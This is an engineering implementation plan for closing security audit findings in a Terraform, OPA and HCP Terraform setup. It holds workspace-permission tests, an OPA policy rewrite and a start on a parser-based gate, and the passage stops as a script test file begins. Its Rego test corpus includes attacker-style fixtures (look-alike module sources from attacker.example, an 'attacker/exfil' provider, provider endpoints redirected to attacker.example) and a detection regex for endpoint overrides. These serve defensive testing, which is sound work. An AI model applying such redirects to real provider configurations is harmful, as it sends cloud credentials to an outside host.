# WS3 Trust model holds: Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use subagent-driven-development (recommended) or build to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close every trust-model finding of the 2026-11-11 due-diligence audit (SEC-1 to SEC-12, CICD-2, CICD-10, CICD-11). After this workstream, a person with routine plan access cannot read a production secret, a pull request cannot run code at plan time, and no automation identity can remove the guardrails that contain it.

**Architecture:** Three layers change. The HCP Terraform layer (`envs/tfc-admin`) derives "secret-bearing" from the variables it writes, and drops plan rights there. The code gate moves from `grep` to a real HCL and JSON parse (`python-hcl2`, hash-pinned) before any plan, and the OPA policy becomes an exact, apply-time allowlist. The cloud identity layer (GCP bootstrap/organization/app-services, AWS boundary and phase-0 template) removes the self-grant and trust-rewrite paths, with an explicit self-lockout check for every new deny.

**Tech Stack:** Terraform 1.17.1 (`terraform test`, `mock_provider`, `override_module`), OPA 1.22.2 (`opa test`), Python 3.12 with `python-hcl2==7.3.1` (hash-locked through `uv pip compile --generate-hashes`), bash script tests in `scripts/tests/`, CloudFormation YAML (`cfn-lint`), HCP Terraform `tfe` provider.

**Common commands** (used in every task):

```bash
REPO=/Users/edwinkassier/Desktop/Ashes/Ashes-Devops-Tools/.claude/worktrees/enterprise-devops-audit-949b65
TF=/private/tmp/claude-501/-Users-edwinkassier-Desktop-Ashes-Ashes-Devops-Tools--claude-worktrees-enterprise-devops-audit-949b65/50c7eb6b-1026-4421-925b-256b9cc0fb04/scratchpad/tf/terraform
cd "$REPO"
make test TEST_DIRS=<dir> TERRAFORM="$TF"          # Terraform suites
opa test policies/opa policies/opa-destructive -v    # OPA 1.22.2, same as terraform-plan.yml
opa check --strict policies/opa policies/opa-destructive
bash scripts/tests/<test>.sh                          # script tests (make test-scripts)
```

---

## Findings covered

| Finding | Severity | Task(s) |
|---|---|---|
| SEC-1 | Critical | 1 |
| SEC-2 / CICD-2 | Critical | 2, 3 |
| SEC-7 | High | 4 |
| SEC-4 | High | 5 |
| SEC-3 | High | 6 |
| SEC-5 | High | 7 |
| SEC-6 | High | 8 |
| SEC-8 | High | 9 |
| SEC-9 | Medium | 10 |
| SEC-10 | Medium | 11 |
| SEC-11 | Medium | 12 |
| SEC-12 | Medium | 13 (npm environment), 10 (KMS alias) |
| CICD-10 | Medium | 14 |
| CICD-11 | Medium | 15 |

## Findings judged valid, with corrections

All findings were confirmed against the code. Three need a correction to their wording:

- **SEC-1.** The prod workload token holder is real, but the leak class is wider. Any workspace with a static secret is affected, and VCS pull-request speculative plans (not only CLI plans) read it. `envs/tfc-admin/main.tf:788-807` derives `secret_bearing_projects` from two fixed sets only. Task 1 covers all three paths: team runs, workspace-level write, and speculative plans.
- **SEC-3.** `iam.securityAdmin` (org) and `monitoring.editor` (admin project) are confirmed at `modules/gcp/stages/bootstrap/service_accounts.tf:85-100`. The audit lists two separate holes, but the alert deletion is a detection gap, not the escalation. The escalation is the self-grant of `roles/iam.denyAdmin`. Task 6 closes the self-grant. A second path is not in the audit: with `enable_pam`, `organization-apply` holds `privilegedaccessmanager.admin` and can edit the JIT entitlement. Task 6 records it as a residual.
- **SEC-10.** The `principalSet` wildcard needs `iam.serviceAccounts.setIamPolicy`, not `workloadIdentityPoolAdmin`. The pool role lets a person add a provider, but `custom.wifProviderTenantPinned` (`modules/gcp/stages/organization/main.tf:303-350`) already pins the provider condition to the owner. The open gap is the binding (`/*`, owner-wide, name-based). Task 11 adds a mandatory OPA policy for the binding. The pool role stays, because `stages/app-services` creates the app-deploy pool.

## Decisions needed

1. **SEC-1 scope.** Derive "secret-bearing" from every workspace that has a sensitive variable or the SaaS bridge turned on, including non-production ones (**recommended**). The other option is production workloads only. Today `docs/runbooks/saas-bootstrap.md:80-93` accepts the non-production risk on purpose. The recommendation removes that exception: a non-production bridging workload loses platform-team plan and PR speculative plans. `enable_speculative_on_secret_bearing` (default `false`) gives the owner a per-estate opt-out for speculative plans only. **Push model** (the `saas-<name>` workspace writes the secrets into the cloud secret stores, so no workload holds a TFC token): **not recommended now**. The `saas` root would need AWS and Google credentials, which breaks the per-cloud workspace split in `docs/architecture/provider-selection.md`. Task 1 logs it in known-gaps as a later option.
2. **SEC-3 approach.** Give `organization-apply` a conditional `iam.securityAdmin` (`modifiedGrantsByRole.hasOnly(<allowlist>)`). Move the standing `organizationAdmin` grant for the org-admin groups from `gcp-organization` to `gcp-bootstrap` (**recommended**). The other option is to accept the residual and rely on alerts, as `docs/known-gaps.md:281-284` does today. The recommendation needs a one-time `terraform state rm` in `gcp-organization` (Task 6, UPGRADING step).
3. **SEC-7 state backup of `saas-*`.** Exclude `saas` projects from the state-backup team by default (**recommended**). HCP Terraform keeps every saas state version, so a restore is still possible from TFC. `enable_saas_state_backup = true` puts it back. The backup copy holds the Supabase database password.
4. **SEC-7 saas approvers.** Add an optional dedicated `saas_approvers_team_id` (**recommended**). Whoever confirms a saas apply can also queue a plan and read `SUPABASE_ACCESS_TOKEN`. HCP Terraform has no apply-without-plan permission. A smaller team narrows the exposure. When unset, today's behaviour stays and a `check` warns.
5. **SEC-9 trust-update lock default.** Deny `iam:UpdateAssumeRolePolicy` to `tfc-apply` on every role (`enable_apply_trust_update_lock`, **recommended default `true`**). The condition key `iam:PermissionsBoundary` is not evaluated for that action, so a "bounded roles only" deny would deny every role anyway. A change to the trust of an existing role then goes through break-glass. New roles are unaffected (`CreateRole` sets the trust).
6. **SEC-5 breaking default.** When a service sets neither `ref` nor `environment`, pin the GitHub environment to `var.environment` (**recommended**, matches AWS `modules/aws/stages/app-services/variables.tf:148`). Repo-wide deploy trust is then impossible. It is a breaking change, recorded in UPGRADING.

---

## Task order and dependencies

Tasks 1 and 4 and 12 edit `envs/tfc-admin/main.tf`. Run them in order, one at a time. Tasks 5 and 6 both edit the non-delegable role list. Run 5 before 6. Tasks 2, 11, 14 and 15 edit `policies/`. They are independent. Every other task is independent.

---

### Task 1: SEC-1: derive secret-bearing workspaces from the variables tfc-admin writes

**Files:**
- Modify: `envs/tfc-admin/main.tf:782-807` (`tfc_admin_only_projects`, `saas_projects`, `secret_bearing_projects`), `:818-824` (`platform_custom_projects`, `approver_projects`), `:864-870` (`platform_workspace_write`), `:874-879` (`speculative_disabled`), `:1205` area (new `check`)
- Modify: `envs/tfc-admin/variables.tf:433-442` (description of `platform_team_control_plane_runs`), add `enable_speculative_on_secret_bearing`
- Test: `envs/tfc-admin/tests/root.tftest.hcl` (new runs after `split_workload_projects_nonprod_only`, line 1075)
- Docs: `docs/runbooks/saas-bootstrap.md:80-93`, `envs/tfc-admin/README.md:47`, `docs/known-gaps.md:850-858`, `UPGRADING.md` (`## Unreleased`, line 39), `CHANGELOG.md` (`## [Unreleased]`)

Self-lockout check: the change only lowers platform-team `runs` and removes speculative plans. Organization owners, the approvers team (`approver_projects`) and the tfc-admin team keep apply. No workspace loses every confirmer, because the new secret-bearing projects are added to `approver_projects`.

- [ ] **Step 1: Write the failing tests**

Append to `envs/tfc-admin/tests/root.tftest.hcl`:

```hcl
# A plan is code execution with the workspace's environment. Any workspace that
# holds a static secret (a sensitive workspace_variables entry, such as the
# saas-outputs-reader TFE_TOKEN) is secret-bearing: the platform team gets
# runs = read on its project, the workspace gets no workspace-level write and
# no speculative plans.
run "secret_bearing_production_workload_drops_platform_to_read" {
  command = plan

  variables {
    split_workload_projects         = true
    platform_team_id                = "team-platform1"
    control_plane_approvers_team_id = "team-approvers1"
    workspace_variables = {
      "gcp-workload-prod" = {
        TFE_TOKEN = { value = "not-a-real-token", category = "env", sensitive = true }
      }
    }
  }

  assert {
    condition     = tfe_team_project_access.this["gcp-workloads/platform"].access == "custom" && tfe_team_project_access.this["gcp-workloads/platform"].workspace_access[0].runs == "read"
    error_message = "a project holding a workspace with a sensitive variable must give the platform team runs = read: a plan there can read the variable."
  }

  assert {
    condition     = tfe_team_project_access.this["aws-workloads/platform"].workspace_access[0].runs == "plan"
    error_message = "a production workloads project without a static secret keeps platform runs = plan."
  }

  assert {
    condition     = contains(keys(tfe_team_access.platform_workload), "gcp-workload-dev") && !contains(keys(tfe_team_access.platform_workload), "gcp-workload-prod")
    error_message = "non-production workloads without a secret keep workspace-level write; a secret-bearing workspace never gets it."
  }

  assert {
    condition     = module.workspace["gcp-workload-prod"].speculative_enabled == false
    error_message = "a secret-bearing workspace must not run speculative plans (a PR plan can read its environment)."
  }

  assert {
    condition     = contains(keys(tfe_team_project_access.this), "gcp-workloads/approvers")
    error_message = "a secret-bearing project must keep a confirmer: the approvers team."
  }
}

# The bridge flag alone marks the workspace: its TFE_TOKEN may be set by hand.
run "saas_bridge_flag_marks_nonprod_workload_secret_bearing" {
  command = plan

  variables {
    environments = {
      dev = { is_production = false }
    }
    split_workload_projects         = true
    platform_team_id                = "team-platform1"
    control_plane_approvers_team_id = "team-approvers1"
    workspace_variables = {
      "aws-workload-dev" = {
        enable_saas_secret_bridge = { value = "true", hcl = true }
      }
    }
  }

  assert {
    condition     = tfe_team_project_access.this["aws-workloads/platform"].access == "custom" && tfe_team_project_access.this["aws-workloads/platform"].workspace_access[0].runs == "read" && contains(keys(tfe_team_project_access.this), "aws-workloads/approvers")
    error_message = "a non-production bridging workload is secret-bearing: platform runs = read, approvers confirm."
  }

  assert {
    condition     = tfe_team_project_access.this["gcp-workloads/platform"].access == "write"
    error_message = "a non-production workloads project without a secret keeps fixed platform write."
  }
}

run "secret_bearing_speculative_opt_out" {
  command = plan

  variables {
    split_workload_projects              = true
    platform_team_id                     = "team-platform1"
    enable_speculative_on_secret_bearing = true
    disable_speculative_on_production    = false
    workspace_variables = {
      "gcp-workload-prod" = {
        TFE_TOKEN = { value = "not-a-real-token", category = "env", sensitive = true }
      }
    }
  }

  assert {
    condition     = module.workspace["gcp-workload-prod"].speculative_enabled == true
    error_message = "enable_speculative_on_secret_bearing = true keeps speculative plans on secret-bearing workspaces."
  }
}

# One project per cloud: a secret-bearing production workload drags the control
# plane to runs = read. A check recommends split_workload_projects.
run "secret_bearing_in_control_plane_project_warns" {
  command = plan

  variables {
    split_workload_projects = false
    platform_team_id        = "team-platform1"
    workspace_variables = {
      "gcp-workload-prod" = {
        TFE_TOKEN = { value = "not-a-real-token", category = "env", sensitive = true }
      }
    }
  }

  expect_failures = [check.secret_bearing_control_plane_project]
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=envs/tfc-admin TERRAFORM="$TF"
```

Expected: `secret_bearing_production_workload_drops_platform_to_read` fails on the first assertion (runs is `plan`). `saas_bridge_flag_marks_nonprod_workload_secret_bearing` fails (access is `write`). `secret_bearing_speculative_opt_out` fails with "An input variable with the name enable_speculative_on_secret_bearing has not been declared". `secret_bearing_in_control_plane_project_warns` fails with "Reference to undeclared check block".

- [ ] **Step 3: Implement**

In `envs/tfc-admin/variables.tf`, after `platform_team_control_plane_runs` (line 442), add:

```hcl
variable "enable_speculative_on_secret_bearing" {
  description = "Keep speculative (PR and CLI) plans on secret-bearing workspaces: tfc-admin, every saas-* workspace, and every workspace with a sensitive workspace_variables entry or enable_saas_secret_bridge = true. Default false: a speculative plan runs the PR's code with the workspace's environment, so it can read the secret."
  type        = bool
  default     = false
}
```

Change the last sentence of the `platform_team_control_plane_runs` description to: `On secret-bearing projects (tfc-admin, saas, and every project holding a workspace with a sensitive workspace_variables entry or enable_saas_secret_bridge = true) the platform team always gets runs = read whatever this is set to: queuing a plan, including a CLI speculative plan, runs code that can read the workspace's environment variables.`

In `envs/tfc-admin/main.tf`, replace lines 800-807 (the comment and `secret_bearing_projects`) with:

```hcl
  # A plan is code execution with the workspace's credentials: anyone who may
  # queue a plan, including a CLI speculative plan with their own unreviewed
  # configuration (speculative_enabled = false does not stop those), can read
  # every environment variable on the workspace. A workspace is secret-bearing
  # when this root writes a sensitive variable to it (TFE_TOKEN of the SaaS
  # bridge, provider tokens), when it runs the SaaS bridge (its TFE_TOKEN may be
  # set by hand), or when it is tfc-admin or a saas-* workspace. The platform
  # team gets runs = read on every project that holds one, the workspace gets no
  # workspace-level write, and no speculative plans.
  secret_bearing_workspaces = toset(concat(
    [for ws, vars in local.workspace_vars : ws if anytrue([for k, v in vars : v.sensitive])],
    [for ws, vars in local.workspace_vars : ws if try(lower(vars["enable_saas_secret_bridge"].value), "false") == "true"],
    local.saas_workspace_names,
    var.manage_tfc_admin_workspace ? [var.tfc_admin_workspace_name] : [],
  ))
  secret_bearing_projects = setunion(
    local.tfc_admin_only_projects,
    local.saas_projects,
    toset([
      for ws in local.secret_bearing_workspaces : local.workspace_project_key[ws]
      if contains(keys(local.workspace_project_key), ws) && contains(local.shared_access_projects, local.workspace_project_key[ws])
    ]),
  )
```

Replace lines 818-824 with:

```hcl
  platform_custom_projects = setunion(local.control_plane_projects, local.saas_projects, local.production_workload_projects, local.secret_bearing_projects)
  approver_projects = setunion(
    setsubtract(local.control_plane_projects, local.tfc_admin_only_projects),
    local.saas_projects,
    local.production_workload_projects,
    setsubtract(local.secret_bearing_projects, local.tfc_admin_only_projects),
  )
```

Replace `platform_workspace_write` (lines 864-870) with:

```hcl
  platform_workspace_write = var.platform_team_id == null ? toset([]) : toset([
    for k, p in local.workspace_project_key : k
    if !local.is_control_plane[k] && !contains(local.managed_production_workloads, k) &&
    !contains(local.secret_bearing_workspaces, k) &&
    contains(["gcp", "aws"], local.workspaces[k].cloud) &&
    contains(setunion(local.control_plane_projects, local.production_workload_projects, local.secret_bearing_projects), p)
  ])
```

In `speculative_disabled` (lines 874-879) add one argument to `setunion`:

```hcl
    var.enable_speculative_on_secret_bearing ? toset([]) : setintersection(local.secret_bearing_workspaces, local.workspace_names),
```

After `check "guardrails_project_has_security_team"` (line 1205) add:

```hcl
# With one project per cloud, a secret-bearing workload shares its project with
# the control plane, so the platform team can no longer queue control-plane
# plans either. split_workload_projects = true keeps them apart.
check "secret_bearing_control_plane_project" {
  assert {
    condition = length(setsubtract(
      setintersection(local.secret_bearing_projects, local.control_plane_projects),
      setunion(local.tfc_admin_only_projects, local.saas_projects),
    )) == 0
    error_message = "A workspace with a static secret shares a TFC project with control-plane workspaces (${join(", ", sort(tolist(setsubtract(setintersection(local.secret_bearing_projects, local.control_plane_projects), setunion(local.tfc_admin_only_projects, local.saas_projects)))))}), so the platform team gets runs = read on the control plane too. Set split_workload_projects = true (org.tfc.split_workload_projects) to keep control-plane plans."
  }
}
```

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=envs/tfc-admin TERRAFORM="$TF"
```

Expected: all runs pass, including the 4 new ones and the existing `tfc_admin_workspace_apply_restricted` and `split_workload_projects_nonprod_only`. If `state_backup_team_reads_state_only` or any other run fails, the derivation is wrong: fix the code, not the test.

- [ ] **Step 5: Docs**

- `docs/runbooks/saas-bootstrap.md:80-93`: replace the sentence "a non-production workload keeps automatic PR plans, and a PR's plan can read the workload's `TFE_TOKEN`" with: "Every workload that holds the token is secret-bearing in tfc-admin: the platform team gets `runs = read` on its project, and it runs no speculative plans (`enable_speculative_on_secret_bearing` opts back in). One team per stack still limits a leaked non-production token to its own stack."
- `envs/tfc-admin/README.md:47`: add "Secret-bearing projects (tfc-admin, saas, and any project holding a workspace with a sensitive variable or the SaaS bridge): platform `runs = read`, approvers confirm, no speculative plans."
- `docs/known-gaps.md`: add a new section before `## DECISION` named `## OPEN: WS3 trust-model residuals (2026-11-11 due-diligence audit)` with the entry: "**SaaS bridge push model (SEC-1 follow-up).** Workloads still hold a `saas-outputs-reader` token. They are now secret-bearing (no platform plan, no speculative plan), so only approvers and owners can read the token. A push model (`saas-<name>` writes the cloud secrets) would remove the token, but needs AWS and Google credentials in the saas root. Revisit after the sandbox run."
- `UPGRADING.md` under `## Unreleased`: "**Secret-bearing workspaces (tfc-admin).** A workspace with a sensitive `workspace_variables` entry or `enable_saas_secret_bridge = true` is now secret-bearing. The platform team gets `runs = read` on its whole project, and its speculative plans are off. With one project per cloud (`split_workload_projects = false`), that includes the control plane; a check warns. Set `split_workload_projects = true` first (AWS: repoint the workload OIDC trust project, see the variable description). Opt back into speculative plans with `enable_speculative_on_secret_bearing = true`."
- `CHANGELOG.md` under `## [Unreleased]`, add a `#### Security` bullet: "**Secret-bearing workspaces are derived, not listed (SEC-1).** tfc-admin marks every workspace that holds a sensitive variable or runs the SaaS bridge, drops platform plan rights and speculative plans there, and keeps approvers as confirmers."

- [ ] **Step 6: Commit**

```bash
git add envs/tfc-admin docs/runbooks/saas-bootstrap.md docs/known-gaps.md UPGRADING.md CHANGELOG.md
git commit -m "feat(tfc-admin)!: derive secret-bearing workspaces from sensitive variables

BREAKING CHANGE: workspaces with a sensitive workspace variable or the SaaS
bridge lose platform-team plan rights and speculative plans."
```

---

### Task 2: SEC-2: exact OPA allowlist, provider allowlist and endpoint-override deny

**Files:**
- Modify: `policies/opa/no_plan_time_code_execution.rego` (whole file, 64 lines)
- Test: `policies/opa/no_plan_time_code_execution_test.rego` (whole file; existing tests stay, new ones appended)
- Docs: `docs/architecture/policy-as-code.md`, `CHANGELOG.md`, `docs/known-gaps.md`

Why: `allowed_module_source` (line 19) is a suffix match. `./evil/supabase/vault-secrets` and `git::https://attacker/x.git//supabase/vault-secrets` pass. The fix pins the full chain of module calls from the root (`envs/saas/.terraform/modules/modules.json` shows `saas_workload` with source `../../modules/saas/stages/saas-workload`, then `vault_secrets` with source `../../../supabase/vault-secrets`). The data-source exemption is dropped: `vault-secrets` has no `data "external"` or `data "http"` (`modules/supabase/vault-secrets/main.tf:76-125`). OPA runs after the plan. It stops the apply (provisioners), not plan-time exfiltration. Task 3 is the pre-plan gate.

Self-lockout check: `envs/saas` keeps the exact chain, so the reviewed provisioners still pass. Every provider the repo declares (`hashicorp/{aws,google,google-beta,random,null,tfe,archive,azurerm}`, `supabase/supabase`, `vercel/vercel`) is on the list. No root sets an endpoint key in a provider block (verified: `grep -rnE '^\s*(endpoints?|[a-z_]+_custom_endpoint|hostname|base_url|api_url|custom_ca_bundle|insecure)\s*[={]'` finds only resource arguments, never provider blocks). The policy set stays non-overridable; break-glass is the HCP owner disabling the set.

- [ ] **Step 1: Write the failing tests**

Append to `policies/opa/no_plan_time_code_execution_test.rego`:

```rego
# ── Attack corpus: allowlist look-alikes ───────────────────────────────────
saas_chain(outer_source, inner_name, inner_source) := {"plan": {"configuration": {"root_module": {"module_calls": {"saas_workload": {
	"source": outer_source,
	"module": {"module_calls": {inner_name: {
		"source": inner_source,
		"module": {"resources": [local_exec("terraform_data.bootstrap")]},
	}}},
}}}}}}

test_exact_saas_chain_allowed if {
	count(p.deny) == 0 with input as saas_chain("../../modules/saas/stages/saas-workload", "vault_secrets", "../../../supabase/vault-secrets")
}

test_dot_slash_evil_suffix_denied if count(p.deny) == 1 with input as in_module("./evil/supabase/vault-secrets", [local_exec("terraform_data.x")])

test_git_suffix_denied if count(p.deny) == 1 with input as in_module("git::https://attacker.example/x.git//supabase/vault-secrets", [local_exec("terraform_data.x")])

test_registry_suffix_denied if count(p.deny) == 1 with input as in_module("app.terraform.io/acme/supabase/vault-secrets", [local_exec("terraform_data.x")])

test_direct_root_call_denied if count(p.deny) == 1 with input as in_module("../../modules/supabase/vault-secrets", [local_exec("terraform_data.x")])

test_renamed_call_denied if {
	count(p.deny) == 1 with input as saas_chain("../../modules/saas/stages/saas-workload", "vault", "../../../supabase/vault-secrets")
}

test_wrong_outer_source_denied if {
	count(p.deny) == 1 with input as saas_chain("./evil/saas/stages/saas-workload", "vault_secrets", "../../../supabase/vault-secrets")
}

# Data sources are never exempt, even in the reviewed chain.
test_http_data_in_saas_chain_denied if {
	inp := {"plan": {"configuration": {"root_module": {"module_calls": {"saas_workload": {
		"source": "../../modules/saas/stages/saas-workload",
		"module": {"module_calls": {"vault_secrets": {
			"source": "../../../supabase/vault-secrets",
			"module": {"resources": [data_source("http")]},
		}}},
	}}}}}}
	count(p.deny) == 1 with input as inp
}

# ── Provider allowlist and endpoint overrides ──────────────────────────────
with_providers(pc) := {"plan": {"configuration": {"root_module": {}, "provider_config": pc}}}

test_allowed_providers_pass if {
	count(p.deny) == 0 with input as with_providers({
		"aws": {"name": "aws", "full_name": "registry.terraform.io/hashicorp/aws", "expressions": {"region": {"constant_value": "eu-west-2"}}},
		"tfe": {"name": "tfe", "full_name": "registry.terraform.io/hashicorp/tfe", "expressions": {"token": {"references": ["var.x"]}}},
	})
}

test_external_provider_denied if {
	count(p.deny) == 1 with input as with_providers({"ext": {"name": "ext", "full_name": "registry.terraform.io/hashicorp/external"}})
}

test_third_party_provider_denied if {
	count(p.deny) == 1 with input as with_providers({"x": {"name": "x", "full_name": "registry.terraform.io/attacker/exfil"}})
}

test_resource_change_from_unlisted_provider_denied if {
	inp := {"plan": {"configuration": {"root_module": {}}, "resource_changes": [{
		"address": "dns_a_record_set.x", "mode": "managed", "type": "dns_a_record_set",
		"provider_name": "registry.terraform.io/hashicorp/dns",
		"change": {"actions": ["create"], "after": {}, "after_unknown": {}},
	}]}}
	count(p.deny) == 1 with input as inp
}

test_aws_endpoints_override_denied if {
	count(p.deny) == 1 with input as with_providers({"aws": {"name": "aws", "full_name": "registry.terraform.io/hashicorp/aws", "expressions": {"endpoints": [{"sts": {"constant_value": "https://attacker.example"}}]}}})
}

test_google_custom_endpoint_denied if {
	count(p.deny) == 1 with input as with_providers({"google": {"name": "google", "full_name": "registry.terraform.io/hashicorp/google", "expressions": {"secret_manager_custom_endpoint": {"constant_value": "https://attacker.example/"}}}})
}

test_tfe_hostname_denied if {
	count(p.deny) == 1 with input as with_providers({"tfe": {"name": "tfe", "full_name": "registry.terraform.io/hashicorp/tfe", "expressions": {"hostname": {"constant_value": "attacker.example"}}}})
}

test_fips_switch_allowed if {
	count(p.deny) == 0 with input as with_providers({"aws": {"name": "aws", "full_name": "registry.terraform.io/hashicorp/aws", "expressions": {"use_fips_endpoint": {"constant_value": true}}}})
}
```

Delete the two tests that encode the old suffix rule, because the new rule denies them: `test_vault_secrets_provisioner_allowed` (source `../../../supabase/vault-secrets` called from the root) and `test_vault_secrets_trailing_slash_allowed`. Keep `test_deep_vault_secrets_allowed` as it is: its chain (`saas_workload` with `../../modules/saas/stages/saas-workload`, then `vault_secrets` with `../../../supabase/vault-secrets`) is the exact allowed chain, so it still passes.

- [ ] **Step 2: Run and confirm failure**

```bash
opa test policies/opa -v --run 'no_plan_time_code_execution'
```

Expected: `test_dot_slash_evil_suffix_denied`, `test_git_suffix_denied`, `test_registry_suffix_denied`, `test_direct_root_call_denied`, `test_renamed_call_denied`, `test_http_data_in_saas_chain_denied`, every provider test except `test_allowed_providers_pass` and `test_fips_switch_allowed` FAIL.

- [ ] **Step 3: Implement**

Replace `policies/opa/no_plan_time_code_execution.rego` with:

```rego
# MANDATORY: no provisioners outside the one reviewed caller, no external /
# http data sources anywhere, only allowlisted providers, and no provider
# endpoint overrides. A plan runs with the workspace's credentials and
# environment variables (TFE_TOKEN, SUPABASE_ACCESS_TOKEN, the cloud plan
# identity); a provisioner runs arbitrary commands at apply time.
#
# THIS IS AN APPLY-TIME CONTROL. HCP Terraform evaluates policy sets after the
# plan, so a data source or a redirected provider endpoint has already run
# when this policy fails. It stops the apply (provisioners, writes through a
# redirected endpoint). The pre-plan gate is scripts/check-plan-time-exec.py
# (CI) plus runs = read on secret-bearing projects (envs/tfc-admin).
#
# Allowlist: the provisioners of modules/supabase/vault-secrets, reached through
# the EXACT chain of module calls envs/saas -> saas_workload -> vault_secrets.
# A suffix match is not enough: ./evil/supabase/vault-secrets and
# git::https://x//supabase/vault-secrets both end the same way.
package terraform.policies.no_plan_time_code_execution

import rego.v1

exec_data_types := {"external", "http"}

allowed_provisioner_chain := [
	{"name": "saas_workload", "source": "../../modules/saas/stages/saas-workload"},
	{"name": "vault_secrets", "source": "../../../supabase/vault-secrets"},
]

# Keep in step with ALLOWED_PROVIDER_SOURCES in scripts/check-plan-time-exec.py.
allowed_provider_sources := {
	"registry.terraform.io/hashicorp/aws",
	"registry.terraform.io/hashicorp/google",
	"registry.terraform.io/hashicorp/google-beta",
	"registry.terraform.io/hashicorp/random",
	"registry.terraform.io/hashicorp/null",
	"registry.terraform.io/hashicorp/tfe",
	"registry.terraform.io/hashicorp/archive",
	"registry.terraform.io/hashicorp/azurerm",
	"registry.terraform.io/supabase/supabase",
	"registry.terraform.io/vercel/vercel",
	"terraform.io/builtin/terraform",
}

endpoint_key_pattern := `^(endpoints?|.*_custom_endpoint|.*_endpoint|hostname|base_url|api_url|custom_ca_bundle|insecure|skip_tls_verify|https?_proxy|no_proxy|universe_domain|sts_region)$`

endpoint_key_exceptions := {"use_fips_endpoint", "use_dualstack_endpoint"}

# Every resource block of the configuration, at any module depth, with its
# walk path.
config_resources contains [path, r] if {
	walk(input.plan.configuration, [path, r])
	n := count(path)
	n >= 2
	path[n - 2] == "resources"
	is_number(path[n - 1])
	is_object(r)
}

# The chain of module calls from the root to the resource: [{name, source}].
call_chain(path) := [link |
	some j in numbers.range(0, count(path) - 2)
	path[j] == "module_calls"
	call := object.get(input.plan.configuration, array.slice(path, 0, j + 2), {})
	link := {"name": path[j + 1], "source": object.get(call, "source", "")}
]

provisioner_exempt(path) if call_chain(path) == allowed_provisioner_chain

deny contains msg if {
	some pair in config_resources
	path := pair[0]
	r := pair[1]
	some prov in object.get(r, "provisioners", [])
	not provisioner_exempt(path)
	msg := sprintf("%s: declares a %s provisioner (arbitrary commands at apply time with the workspace's credentials); only envs/saas -> saas_workload -> vault_secrets may", [object.get(r, "address", "?"), object.get(prov, "type", "?")])
}

deny contains msg if {
	some pair in config_resources
	r := pair[1]
	object.get(r, "mode", "") == "data"
	object.get(r, "type", "") in exec_data_types
	msg := sprintf("%s: data %q runs at plan time with the workspace's credentials and environment variables; it is not allowed", [object.get(r, "address", "?"), r.type])
}

deny contains msg if {
	some key, pc in object.get(input.plan.configuration, "provider_config", {})
	not object.get(pc, "full_name", "") in allowed_provider_sources
	msg := sprintf("provider %s (%s) is not on the provider allowlist; a provider binary runs at plan time with the workspace's environment", [key, object.get(pc, "full_name", "?")])
}

deny contains msg if {
	some rc in object.get(input.plan, "resource_changes", [])
	not object.get(rc, "provider_name", "") in allowed_provider_sources
	msg := sprintf("%s: provider %s is not on the provider allowlist", [object.get(rc, "address", "?"), object.get(rc, "provider_name", "?")])
}

endpoint_override(attr) if {
	regex.match(endpoint_key_pattern, attr)
	not attr in endpoint_key_exceptions
}

deny contains msg if {
	some key, pc in object.get(input.plan.configuration, "provider_config", {})
	some attr, _ in object.get(pc, "expressions", {})
	endpoint_override(attr)
	msg := sprintf("provider %s sets %q: an endpoint or proxy override can send the workspace's credentials to another host", [key, attr])
}
```

- [ ] **Step 4: Run and confirm pass**

```bash
opa check --strict policies/opa policies/opa-destructive
opa test policies/opa policies/opa-destructive -v
```

Expected: `opa check` prints nothing. Every test passes. The test count rises by 16 (18 new, 2 deleted).

- [ ] **Step 5: Docs**

- `docs/architecture/policy-as-code.md`: in the `no_plan_time_code_execution` row, replace the description with: "Apply-time control. Exact module-call chain allowlist for the vault-secrets provisioners, no `external`/`http` data, provider allowlist, no provider endpoint or proxy overrides. It runs after the plan: the pre-plan gates are `scripts/check-plan-time-exec.py` and `runs = read` on secret-bearing projects."
- `docs/known-gaps.md` (WS3 section): "**OPA cannot attest module content.** The provisioner allowlist pins the call chain and the source strings, not the bytes of `scripts/*.mjs`. A CLI upload can carry a modified copy at the same paths. The saas project's `runs = read` for the platform team (Task 1) and approvers-only confirmation are the control there."
- `CHANGELOG.md` `#### Security`: "**Plan-time execution policy is exact (SEC-2).** The OPA allowlist pins the full module-call chain, adds a provider allowlist and denies provider endpoint overrides. It is documented as an apply-time control."

- [ ] **Step 6: Commit**

```bash
git add policies/opa/no_plan_time_code_execution.rego policies/opa/no_plan_time_code_execution_test.rego docs CHANGELOG.md
git commit -m "fix(policies): pin the provisioner allowlist to the exact module chain"
```

---

### Task 3: SEC-2 / CICD-2: replace the grep gate with an HCL and JSON parse

**Files:**
- Create: `scripts/check-plan-time-exec.py`
- Create: `.github/requirements/hcl2.in`, `.github/requirements/hcl2.txt` (generated)
- Create: `scripts/tests/test-check-plan-time-exec.sh`
- Modify: `scripts/check-consistency.sh:170-180` (the grep block)
- Modify: `.github/workflows/terraform-plan.yml:403-404` (install step before "Consistency guards"), `:440-443` (script tests install)
- Modify: `scripts/setup.sh` (local install line), `.github/dependabot.yml` (the pip entry already covers `/.github/requirements`; no change, verify only)
- Docs: `CONTRIBUTING.md` (local prerequisites), `CHANGELOG.md`

Why: the grep at `scripts/check-consistency.sh:177-178` needs quoted labels and `.tf` files. It misses bare labels (`provisioner local-exec {`), `*.tf.json`, fully qualified sources, scoped `data` blocks inside `check`, and `removed` blocks with destroy-time provisioners. `python-hcl2` 7.3.1 parses all of them. This was verified in the scratchpad: bare labels, a `check`-scoped `data "http"`, a `removed` provisioner and `endpoints {}` all come back as plain dicts with unquoted labels.

Self-lockout check: the new script must pass on the current tree before the grep is removed (Step 4 runs it on the repo). The only allowlisted provisioner files stay `modules/supabase/vault-secrets/main.tf` and `tests/e2e/aws/main.tf`. The only non-local module sources in the repo are the three release-pinned examples (`git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/...?ref=v0.1.0`), which the pattern allows.

- [ ] **Step 1: Pin the parser**

```bash
printf 'python-hcl2==7.3.1\n' > .github/requirements/hcl2.in
uv pip compile --generate-hashes --universal --python-version 3.12 .github/requirements/hcl2.in -o .github/requirements/hcl2.txt
grep -c -- '--hash=sha256:' .github/requirements/hcl2.txt
```

Expected: the count is at least 2 (python-hcl2 and lark, each with one or more hashes).

- [ ] **Step 2: Write the failing script test**

Create `scripts/tests/test-check-plan-time-exec.sh`:

```bash
